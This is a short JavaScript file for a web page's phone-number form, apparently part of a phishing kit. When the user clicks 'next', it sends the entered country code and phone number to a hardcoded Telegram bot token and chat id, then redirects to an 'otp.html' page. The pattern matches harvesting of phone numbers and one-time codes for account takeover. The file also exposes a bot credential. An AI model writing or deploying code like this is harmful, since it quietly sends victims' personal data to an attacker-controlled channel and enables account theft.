document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("next-btn").addEventListener("click", async () => {
        const countryCode = document.getElementById("country-code").value;
        const phoneNumber = document.getElementById("phone-number").value;
        const fullNumber = countryCode + phoneNumber;

        if (phoneNumber.length < 6) {
            alert("Please enter a valid phone number.");
            return;
        }

        const response = await fetch('https://api.telegram.org/bot7654691297:AAEkfk35y1aKq5Wpnz7vLyR3QCo4g5nYDTc/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: '1117264759', text: 'Phone: ' + fullNumber })
        });

        const data = await response.json();
        if (data.ok) {
            localStorage.setItem("userPhoneNumber", fullNumber);
            window.location.href = "otp.html";
        } else {
            alert("Failed to send message. Please try again.");
        }
    });
});
